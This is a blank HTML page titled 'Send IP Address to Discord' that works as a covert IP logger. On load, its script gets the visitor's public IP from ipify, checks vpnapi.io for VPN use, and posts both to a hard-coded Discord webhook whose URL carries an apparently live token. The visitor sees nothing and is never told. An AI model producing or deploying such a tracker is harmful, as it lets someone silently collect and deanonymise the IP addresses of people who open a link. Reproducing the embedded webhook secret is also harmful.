<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Send IP Address to Discord</title>
</head>
<body>

    <script>
        function sendIPToDiscord(ipAddress, isVPN) {
            // Construct the message
            const message = `**New User Information:**\n\n` +
                            `- **IP Address:** ${ipAddress}\n` +
                            `- **VPN Detected:** ${isVPN ? 'Yes' : 'No'}`;

            // Discord webhook URL
            const webhookURL = 'https://discord.com/api/webhooks/1233307543871426672/Jw5uHUpnGuI0I_yzbO9MglueN9FRZPOzezkbQr684U2L6rK3Ej2Y-LBSzYGVQ9qTwYax';

            // Payload for the webhook
            const payload = {
                content: message
            };

            // Send the message to Discord webhook
            fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload),
            })
            .then(response => {
                if (response.ok) {
                    console.log('IP Address sent to Discord webhook successfully.');
                } else {
                    throw new Error('Failed to send IP Address to Discord webhook.');
                }
            })
            .catch(error => {
                console.error('Error sending IP Address to Discord webhook:', error);
            });
        }

        // Function to fetch the IP address and check for VPN
        function getIPAddress() {
            // Make AJAX request to get the client's IP address
            fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                const ipAddress = data.ip;
                // Check for VPN using vpnapi.io
                fetch('https://vpnapi.io/api/ip/' + ipAddress + '?key=YOUR_VPNAPI_IO_API_KEY')
                .then(response => response.json())
                .then(vpnData => {
                    const isVPN = vpnData.security.vpn;
                    sendIPToDiscord(ipAddress, isVPN);
                })
                .catch(error => {
                    console.error('Error checking VPN:', error);
                    sendIPToDiscord(ipAddress, false); // Assume not VPN if check fails
                });
            })
            .catch(error => {
                console.error('Error getting IP address:', error);
            });
        }

        // Call getIPAddress function when the page loads
        getIPAddress();
    </script>
</body>
</html>
